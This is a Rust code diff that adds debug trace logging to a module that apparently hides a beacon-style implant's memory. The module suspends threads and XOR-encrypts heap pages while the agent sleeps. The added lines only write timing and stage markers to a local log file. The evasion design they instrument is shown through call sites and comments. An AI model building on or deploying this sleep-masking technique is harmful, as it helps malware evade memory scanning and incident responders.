@@ -88,6 +88,16 @@ unsafe extern "system" {
         system_information_length: u32,
         return_length: *mut u32,
     ) -> i32;
+    fn CreateFileW(
+        lpFileName: *const u16,
+        dwDesiredAccess: u32,
+        dwShareMode: u32,
+        lpSecurityAttributes: *const c_void,
+        dwCreationDisposition: u32,
+        dwFlagsAndAttributes: u32,
+        hTemplateFile: *mut c_void,
+    ) -> *mut c_void;
+    fn GetTickCount64() -> u64;
 }
 
 #[derive(Clone, Copy, Default)]
@@ -100,6 +110,17 @@ struct ThreadSlot {
     rsp: u64,
     suspended: bool,
 }
+
+// Trace-file FFI constants (print_debug staging). Only used by the trace helpers,
+// which are no-ops without `print_debug`.
+#[cfg(feature = "print_debug")]
+const TRACE_FILE_APPEND: u32 = 0x4; // FILE_APPEND_DATA
+#[cfg(feature = "print_debug")]
+const TRACE_FILE_OPEN_ALWAYS: u32 = 3; // OPEN_ALWAYS
+#[cfg(feature = "print_debug")]
+const TRACE_FILE_SHARE: u32 = 0x1 | 0x2; // FILE_SHARE_READ | FILE_SHARE_WRITE
+#[cfg(feature = "print_debug")]
+const TRACE_FILE_ATTR: u32 = 0x80; // FILE_ATTRIBUTE_NORMAL
 
 // RAII guard: resumes any still-suspended threads and closes opened handles when
 // the per-cycle slot buffer leaves scope (including early returns / skipped
@@ -223,6 +244,7 @@ fn ensure_watchdog() -> Option<&'static Sender<WatchdogCommand>> {
 }
 
 fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, ntdll: (usize, usize)) {
+    trace_init();
     let ntqit = resolve_ntquery();
     let ntqsi = resolve_ntqsi();
     let mut guard: Option<MemGuard> = MemGuard::new();
@@ -949,6 +971,10 @@ fn run_dormancy(
                 break;
             }
         }
+        trace_line(
+            "dormancy-attempt",
+            format_args!("i={attempt} all_waiting={all_waiting}"),
+        );
         if !all_waiting {
             sleep_backoff(attempt);
             continue;
@@ -971,6 +997,7 @@ fn run_dormancy(
             }
             s.suspended = true;
         }
+        trace_line("suspended", format_args!("n={n}"));
         if !suspend_ok {
             resume_all(&mut buf[..n]);
             sleep_backoff(attempt);
@@ -994,6 +1021,7 @@ fn run_dormancy(
             sleep_backoff(attempt);
             continue;
         }
+        trace_line("verified-ok", format_args!("n={n}"));
 
         // All dormant: add the RSP hot window for each suspended thread. A failure
         // here is fail-closed (we must not encrypt around a thread whose in-use
@@ -1004,6 +1032,7 @@ fn run_dormancy(
                 return (DormancyResult::Fail, 0);
             }
         }
+        trace_line("rsp-exclusions", format_args!("n={n}"));
         return (DormancyResult::Ok, n);
     }
     (DormancyResult::RetryExhausted, 0)
@@ -1063,6 +1092,7 @@ fn thread_set_unchanged(self_tid: u32, slots: &[ThreadSlot]) -> bool {
 /// as plaintext and no suspended thread is resumed into corrupted state.
 fn ensure_decrypted(guard: &mut MemGuard) {
     for attempt in 0..DECRYPT_MAX_ATTEMPTS {
+        trace_line("decrypt-attempt", format_args!("attempt={attempt}"));
         if guard.decrypt() {
             return;
         }
@@ -1085,15 +1115,28 @@ fn run_cycle(
 ) -> CycleOutcome {
     let self_tid = unsafe { GetCurrentThreadId() };
 
+    trace_line("cmd-received", format_args!("interval={interval_secs}"));
+
     if calib.is_none() {
         let oracle = toolhelp_tids(self_tid);
         match calibrate_spi(ntqsi, self_tid, &oracle) {
             Some(layout) => {
                 emit_calib(layout.pid_offset, layout.threads_offset);
+                trace_line(
+                    "calib-done",
+                    format_args!(
+                        "pid_off=0x{:x} threads_off=0x{:x}",
+                        layout.pid_offset, layout.threads_offset
+                    ),
+                );
                 *calib = Some(layout);
             }
             None => {
                 emit_skip("layout calibration failed");
+                trace_line(
+                    "cycle-return",
+                    format_args!("skipped=true reason=calib-failed"),
+                );
                 plain_sleep(interval_secs);
                 return CycleOutcome {
                     pages: 0,
@@ -1123,6 +1166,10 @@ fn run_cycle(
         DormancyResult::Ok => {}
         DormancyResult::RetryExhausted => {
             emit_skip("running threads");
+            trace_line(
+                "cycle-return",
+                format_args!("skipped=true reason=running-threads"),
+            );
             plain_sleep(interval_secs);
             return CycleOutcome {
                 pages: 0,
@@ -1131,6 +1178,10 @@ fn run_cycle(
         }
         DormancyResult::Fail => {
             emit_skip("dormancy failed");
+            trace_line(
+                "cycle-return",
+                format_args!("skipped=true reason=dormancy-failed"),
+            );
             plain_sleep(interval_secs);
             return CycleOutcome {
                 pages: 0,
@@ -1143,28 +1194,61 @@ fn run_cycle(
     if !thread_set_unchanged(self_tid, &slots.slots[..n]) {
         resume_all(&mut slots.slots[..n]);
         emit_skip("thread set changed");
+        trace_line(
+            "cycle-return",
+            format_args!("skipped=true reason=thread-set-changed"),
+        );
         plain_sleep(interval_secs);
         return CycleOutcome {
             pages: 0,
             skipped: true,
         };
     }
+    trace_line("threadset-check", format_args!("ok"));
 
-    if !guard.encrypt() {
-        // Encrypt failed mid-pass: restore whatever was already XOR'd. If that
-        // restore fails, terminate — never resume into corrupted state.
+    let t0_enc = trace_now();
+    trace_line(
+        "encrypt-start",
+        format_args!("skip_count={}", guard.skip_count()),
+    );
+    let mut last = 0usize;
+    let encrypt_ok = guard.encrypt_with_progress(&mut |done: usize| {
+        if done / 10000 != last / 10000 {
+            last = done;
+            trace_line("encrypt-progress", format_args!("pages_done={done}"));
+        }
+    });
+    let enc_elapsed = trace_now() - t0_enc;
+    if !encrypt_ok {
         emit_skip("encrypt failed");
         ensure_decrypted(guard);
+        trace_line(
+            "cycle-return",
+            format_args!("skipped=true reason=encrypt-failed"),
+        );
         plain_sleep(interval_secs);
         return CycleOutcome {
             pages: 0,
             skipped: true,
         };
     }
+    trace_line(
+        "encrypt-done",
+        format_args!(
+            "pages={} elapsed_ms={}",
+            guard.encrypted_count(),
+            enc_elapsed
+        ),
+    );
+    trace_line(
+        "exclusions-done",
+        format_args!("skip_count={}", guard.skip_count()),
+    );
 
     let pages = guard.encrypted_count();
     let dormant = slots.slots[..n].iter().filter(|s| s.suspended).count();
     emit_engage(dormant, pages, interval_secs);
+    trace_line("engage-emitted", format_args!("pages={pages}"));
 
     // --- QA debug knobs (gated to test / print_debug builds) -------------------
     // MIDWAKE: shorten the encrypted sleep window to S seconds (S < interval).
@@ -1181,7 +1265,9 @@ fn run_cycle(
         }
         None => interval_secs,
     };
+    trace_line("sleep-start", format_args!("secs={encrypted_sleep}"));
     plain_sleep(encrypted_sleep);
+    trace_line("sleep-done", format_args!("secs={encrypted_sleep}"));
 
     // PARTIAL_DECRYPT: at wake, skip the full decrypt and leave (N - K) pages
     // encrypted so the resumed runtime exercises the VEH lazy-decrypt path live.
@@ -1193,6 +1279,8 @@ fn run_cycle(
     #[cfg(not(any(test, feature = "print_debug")))]
     let partial: Option<usize> = None;
 
+    let t0_dec = trace_now();
+    trace_line("decrypt-start", format_args!("partial={:?}", partial));
     match partial {
         Some(k) => {
             #[cfg(any(test, feature = "print_debug"))]
@@ -1207,11 +1295,16 @@ fn run_cycle(
         }
     }
 
+    let dec_elapsed = trace_now() - t0_dec;
+    trace_line("decrypt-done", format_args!("elapsed_ms={dec_elapsed}"));
+
     let resumed = slots.slots[..n].iter().filter(|s| s.suspended).count();
     emit_wake(pages, resumed);
+    trace_line("wake-sent", format_args!("pages={pages}"));
     // Resume threads now (SlotsGuard Drop) so the remaining unencrypted sleep
     // below, if any, runs with the runtime live.
     drop(slots);
+    trace_line("resumed", format_args!("n={n}"));
     // MIDWAKE remaining unencrypted sleep preserves beacon timing; the agent is
     // woken after the full interval by the caller.
     if let Some(s) = mid {
@@ -1220,6 +1313,7 @@ fn run_cycle(
             plain_sleep(remaining);
         }
     }
+    trace_line("cycle-return", format_args!("skipped=false pages={pages}"));
     CycleOutcome {
         pages,
         skipped: false,
@@ -1227,6 +1321,19 @@ fn run_cycle(
 }
 
 // ---------------------------------------------------------------------------
+// Stage tracing to a dedicated file (independent of stdout plumbing). Opened once
+// at watchdog init; never closed for the process lifetime. Writes are
+// non-allocating (stack buffer) so they are safe both before and after the heap is
+// encrypted. When `print_debug` is off, `trace_init`/`trace_line`/`trace_now` are
+// no-ops and nothing is opened. This exists because a blocked stdout pipe under a
+// session-0 scheduled-task launch can stall `dbg_print`'s WriteFile; the trace
+// file (a real file, not a pipe) cannot block on a reader.
+#[cfg(feature = "print_debug")]
+static TRACE_HANDLE: core::sync::atomic::AtomicPtr<c_void> =
+    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());
+#[cfg(feature = "print_debug")]
+static TRACE_T0: OnceLock<u64> = OnceLock::new();
+
 // Non-allocating `print_debug` output. During the encrypted window the process
 // heap is PAGE_NOACCESS, so a normal `println!`/`log::info!` (which allocate)
 // would fault. These lines are written straight to stdout via WriteFile using a
@@ -1235,7 +1342,7 @@ fn run_cycle(
 
 #[cfg(feature = "print_debug")]
 struct StackBuf {
-    buf: [u8; 160],
+    buf: [u8; 256],
     len: usize,
 }
 
@@ -1281,7 +1388,7 @@ fn dbg_print(b: &StackBuf) {
 #[cfg(feature = "print_debug")]
 fn emit_engage(dormant: usize, pages: usize, interval: f64) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(
@@ -1298,7 +1405,7 @@ fn emit_engage(dormant: usize, pages: usize, interval: f64) {
 #[cfg(feature = "print_debug")]
 fn emit_skip(reason: &str) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(&mut b, format_args!("memguard skip: {reason}\n"));
@@ -1308,7 +1415,7 @@ fn emit_skip(reason: &str) {
 #[cfg(feature = "print_debug")]
 fn emit_wake(pages: usize, resumed: usize) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(
@@ -1321,7 +1428,7 @@ fn emit_wake(pages: usize, resumed: usize) {
 #[cfg(feature = "print_debug")]
 fn emit_calib(pid_off: usize, threads_off: usize) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(
@@ -1346,7 +1453,7 @@ fn emit_wake(_pages: usize, _resumed: usize) {}
 #[cfg(feature = "print_debug")]
 fn emit_midwake(secs: f64) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(&mut b, format_args!("memguard debug: midwake after "));
@@ -1360,7 +1467,7 @@ fn emit_midwake(_secs: f64) {}
 #[cfg(feature = "print_debug")]
 fn emit_partial(k: usize) {
     let mut b = StackBuf {
-        buf: [0u8; 160],
+        buf: [0u8; 256],
         len: 0,
     };
     let _ = core::fmt::write(
@@ -1371,6 +1478,82 @@ fn emit_partial(k: usize) {
 }
 #[cfg(not(feature = "print_debug"))]
 fn emit_partial(_k: usize) {}
+
+#[cfg(feature = "print_debug")]
+fn trace_init() {
+    TRACE_T0.get_or_init(|| unsafe { GetTickCount64() });
+    if !TRACE_HANDLE
+        .load(core::sync::atomic::Ordering::Acquire)
+        .is_null()
+    {
+        return;
+    }
+    let name: Vec<u16> = "memguard-trace.log"
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
+    let h = unsafe {
+        CreateFileW(
+            name.as_ptr(),
+            TRACE_FILE_APPEND,
+            TRACE_FILE_SHARE,
+            core::ptr::null(),
+            TRACE_FILE_OPEN_ALWAYS,
+            TRACE_FILE_ATTR,
+            core::ptr::null_mut(),
+        )
+    };
+    if (h as usize) == usize::MAX || h.is_null() {
+        TRACE_HANDLE.store(core::ptr::null_mut(), core::sync::atomic::Ordering::Release);
+    } else {
+        TRACE_HANDLE.store(h, core::sync::atomic::Ordering::Release);
+    }
+}
+#[cfg(not(feature = "print_debug"))]
+fn trace_init() {}
+
+#[cfg(feature = "print_debug")]
+fn trace_now() -> u64 {
+    let t0 = *TRACE_T0.get().unwrap_or(&0);
+    unsafe { GetTickCount64() }.wrapping_sub(t0)
+}
+#[cfg(not(feature = "print_debug"))]
+fn trace_now() -> u64 {
+    0
+}
+
+#[cfg(feature = "print_debug")]
+fn trace_line(stage: &str, extra: core::fmt::Arguments<'_>) {
+    let elapsed = trace_now();
+    let mut b = StackBuf {
+        buf: [0u8; 256],
+        len: 0,
+    };
+    let _ = core::fmt::write(&mut b, format_args!("[{elapsed:>8}ms] {stage} "));
+    let _ = core::fmt::write(&mut b, extra);
+    let _ = core::fmt::write(
+        &mut b,
+        format_args!(
+            "
+"
+        ),
+    );
+    let h = TRACE_HANDLE.load(core::sync::atomic::Ordering::Acquire);
+    if !h.is_null() {
+        let mut written = 0u32;
+        unsafe {
+            let _ = WriteFile(
+                h,
+                b.buf.as_ptr() as *const c_void,
+                b.len as u32,
+                &mut written,
+                core::ptr::null_mut(),
+            );
+        }
+    }
+}
+#[cfg(not(feature = "print_debug"))]
+fn trace_line(_stage: &str, _extra: core::fmt::Arguments<'_>) {}
 
 // ---------------------------------------------------------------------------
 // Windows-gated integration test: one full dormancy + encrypt + decrypt +
